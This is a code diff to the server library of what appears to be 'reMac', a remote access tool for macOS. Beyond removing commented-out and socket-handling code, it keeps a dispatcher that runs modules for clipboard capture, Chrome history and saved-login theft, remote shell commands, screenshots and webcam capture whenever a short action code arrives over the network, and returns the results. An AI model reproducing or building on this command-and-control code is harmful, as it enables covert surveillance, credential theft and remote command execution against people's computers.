@@ -3,9 +3,6 @@
 # __license__ = "GPLv3"
 
 import sys
-import selectors
-import struct
-
 from modules import mod_hello
 from modules import mod_clipboard
 from modules import mod_chrome_history
@@ -13,9 +10,8 @@ from modules import mod_chrome_logins
 from modules import mod_shellcmd
 from modules import mod_screenshot
 from modules import mod_webcam
-
 from apps.libs.reMac_libbase import reMac_libbase
-# from reMac_libbase import reMac_libbase
+
 
 reMacModules = {
     'hw': mod_hello.mod_hello(),
@@ -27,30 +23,16 @@ reMacModules = {
     'wc': mod_webcam.mod_webcam()
 }
 
+
 class reMac_libserver(reMac_libbase):
     def __init__(self, selector, sock, addr):
         reMac_libbase.__init__(self, selector, sock, addr)
-        # self.selector = selector
-        # self.sock = sock
-        # self.addr = addr
         self._recv_buffer = b""
         self._send_buffer = b""
         self._jsonheader_len = None
         self.jsonheader = None
         self.request = None
         self.response_created = False
-
-    # def _set_selector_events_mask(self, mode):
-    #     """Set selector to listen for events: mode is 'r', 'w', or 'rw'."""
-    #     if mode == "r":
-    #         events = selectors.EVENT_READ
-    #     elif mode == "w":
-    #         events = selectors.EVENT_WRITE
-    #     elif mode == "rw":
-    #         events = selectors.EVENT_READ | selectors.EVENT_WRITE
-    #     else:
-    #         raise ValueError(f"Invalid events mask mode {repr(mode)}.")
-    #     self.selector.modify(self.sock, events, data=self)
 
     def _read(self):
         try:
@@ -80,17 +62,6 @@ class reMac_libserver(reMac_libbase):
                 if sent and not self._send_buffer:
                     self.close()
 
-    # def _json_encode(self, obj, encoding):
-    #     return json.dumps(obj, ensure_ascii=False).encode(encoding)
-    #
-    # def _json_decode(self, json_bytes, encoding):
-    #     tiow = io.TextIOWrapper(
-    #         io.BytesIO(json_bytes), encoding=encoding, newline=""
-    #     )
-    #     obj = json.load(tiow)
-    #     tiow.close()
-    #     return obj
-
     def processInput(self, input):
         if input == "q":  # or input == "quit":
             sys.exit(1)
@@ -106,33 +77,9 @@ class reMac_libserver(reMac_libbase):
                 or input == "wc" \
                 or input == "d":  # or input == "help":
             return reMacModules[input].run_mod()
-        # elif input == "cl":  # or input == "chromeLogins":
-        #     reMacModules[input].run_mod()
-        # elif input == "sh":  # or input == "shell":
-        #     reMacModules[input].run_mod()
-        # elif input == "sc":  # or input == "screenshot":
-        #     reMacModules[input].run_mod()
-        # elif input == "wc":  # or input == "screenshot":
-        #     reMacModules[input].run_mod()
-        # elif input == "d" or input == "dev":
-        #     reMacModules['sc'].run_mod()
         else:
             print(f"Command '{input}' NOT FOUND! Check the following command list")
             # print_help()
-
-    # def _create_message(
-    #     self, *, content_bytes, content_type, content_encoding
-    # ):
-    #     jsonheader = {
-    #         "byteorder": sys.byteorder,
-    #         "content-type": content_type,
-    #         "content-encoding": content_encoding,
-    #         "content-length": len(content_bytes),
-    #     }
-    #     jsonheader_bytes = self._json_encode(jsonheader, "utf-8")
-    #     message_hdr = struct.pack(">H", len(jsonheader_bytes))
-    #     message = message_hdr + jsonheader_bytes + content_bytes
-    #     return message
 
     def _create_response_json_content(self):
         action = self.request.get("action")
@@ -141,12 +88,6 @@ class reMac_libserver(reMac_libbase):
                 or action == "ch":
             answer = self.processInput(action)
             content = {"action": action, "result": answer}
-        # elif action == "cb":
-        #     answer = self.processInput(action)  # f'HelloWorld action called!!!'
-        #     content = {"action": action, "result": answer}
-        # elif action == "ch":
-        #     answer = self.processInput(action)  # f'HelloWorld action called!!!'
-        #     content = {"action": action, "result": answer}
         else:
             content = {"action": action, "result": f'Error: invalid action "{action}".'}
         content_encoding = "utf-8"
@@ -165,12 +106,6 @@ class reMac_libserver(reMac_libbase):
             "content_encoding": "binary",
         }
         return response
-
-    def process_events(self, mask):
-        if mask & selectors.EVENT_READ:
-            self.read()
-        if mask & selectors.EVENT_WRITE:
-            self.write()
 
     def read(self):
         self._read()
@@ -192,51 +127,6 @@ class reMac_libserver(reMac_libbase):
                 self.create_response()
 
         self._write()
-
-    def close(self):
-        print("closing connection to", self.addr)
-        try:
-            self.selector.unregister(self.sock)
-        except Exception as e:
-            print(
-                "error: selector.unregister() exception for",
-                f"{self.addr}: {repr(e)}",
-            )
-
-        try:
-            self.sock.close()
-        except OSError as e:
-            print(
-                "error: socket.close() exception for",
-                f"{self.addr}: {repr(e)}",
-            )
-        finally:
-            # Delete reference to socket object for garbage collection
-            self.sock = None
-
-    def process_protoheader(self):
-        hdrlen = 2
-        if len(self._recv_buffer) >= hdrlen:
-            self._jsonheader_len = struct.unpack(
-                ">H", self._recv_buffer[:hdrlen]
-            )[0]
-            self._recv_buffer = self._recv_buffer[hdrlen:]
-
-    def process_jsonheader(self):
-        hdrlen = self._jsonheader_len
-        if len(self._recv_buffer) >= hdrlen:
-            self.jsonheader = self._json_decode(
-                self._recv_buffer[:hdrlen], "utf-8"
-            )
-            self._recv_buffer = self._recv_buffer[hdrlen:]
-            for reqhdr in (
-                "byteorder",
-                "content-length",
-                "content-type",
-                "content-encoding",
-            ):
-                if reqhdr not in self.jsonheader:
-                    raise ValueError(f'Missing required header "{reqhdr}".')
 
     def process_request(self):
         content_len = self.jsonheader["content-length"]
